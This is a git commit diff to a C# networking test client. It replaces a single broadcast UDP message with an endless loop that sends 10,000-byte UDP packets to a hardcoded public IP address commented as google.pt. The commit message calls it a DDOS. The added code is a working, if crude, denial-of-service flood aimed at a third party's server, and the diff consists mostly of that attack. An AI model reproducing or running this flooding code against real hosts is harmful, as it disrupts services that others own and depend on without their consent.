24cfe55b4da3b23b244a67407d2d8eb4dfd51ef4
Milkenm <miguel.campos.johnny@gmail.com>
2020-09-17 01:52:58 +0100

    DDOS local network wtf xD

--- NetworkBroadcastClientTesting/NetworkClient.cs
+++ NetworkBroadcastClientTesting/NetworkClient.cs
@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Net;
-
-using static ScriptsLib.Network.Packets;
+using System.Net.Sockets;
+using System.Text;
 
 namespace NetworkBroadcastClientTesting
 {
@@ -9,7 +9,24 @@ namespace NetworkBroadcastClientTesting
     {
         private static void Main()
         {
-            SendUdpPacket(IPAddress.Broadcast.ToString(), 11000, "lel");
+            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+
+            IPAddress broadcast = IPAddress.Parse("216.58.201.163"); // google.pt
+
+            string sendString = "";
+            for (int i = 0; i < 10000; i++)
+            {
+                sendString = sendString + "z";
+            }
+
+            byte[] sendbuf = Encoding.ASCII.GetBytes(sendString);
+            IPEndPoint ep = new IPEndPoint(broadcast, 11000);
+
+            while (true)
+            {
+                s.SendTo(sendbuf, ep);
+            }
+
             Console.WriteLine("Message sent to the broadcast address");
         }
     }
